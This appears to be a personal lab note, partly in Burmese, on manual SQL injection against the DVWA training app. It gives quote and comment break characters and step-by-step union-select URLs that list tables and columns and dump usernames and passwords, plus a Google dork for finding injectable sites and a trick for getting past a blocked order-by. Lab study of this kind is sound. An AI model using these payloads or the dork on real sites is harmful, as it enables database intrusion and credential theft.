
1.  Integer base = 1
2.  String Base = '1'    , "1"     ,      `1`

sql test   =>
'
"
(`)
\



sql comment
# 
%23
(`)
%60
(-- -)
--+ 
;


 
Step 1 -> fix the error with command 
(error fix yar mar ' pr yin string base  // ' ma par yin integer base)

Step 2 -> Find the column count with order by

![[Pasted image 20230122113050.png]]

Step 3 -> Find the vlun column with union select 
(pout dae column dwe ma paw yin id shay mr - value lay net san kyi)   -> we use 1,2 cuz we alerady know there is 2 column on second stage

![[Pasted image 20230122113815.png]]

we use concat function id vlun colum was just 1 // we wanna know more information  -> we use ,0x3a3a3a,   to sperate two column

![[Pasted image 20230122115234.png]]


Sql with XSS 
![[Pasted image 20230122120146.png]]

===> Here is with post method   **

![[Pasted image 20230122142121.png]]


Step 4=>  Find the table name from database
10.0.2.9/DVWA/vulnerabilities/sqli/?id=1’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database()-- -&Submit=Submit#


Step 5=> Find the column name from table
1’ union select group_concat(column_name),2 from information_schema.columns where table_schema=database() and table_name='users'-- -&Submit=Submit#

Step 6 => dump data from column
10.0.2.9/DVWA/vulnerabilities/sqli/?id=1’ union select group_concat('<br/>’,user,0x3a3a,password),2 from users-- -&Submit=Submit


-------
inurl"index.php id=’    => google docking 

*** orderby ko block htar yin groupby ko use




=>  blind base and error base 
[https://pastebin.com/V6pwM7KF](https://pastebin.com/V6pwM7KF)




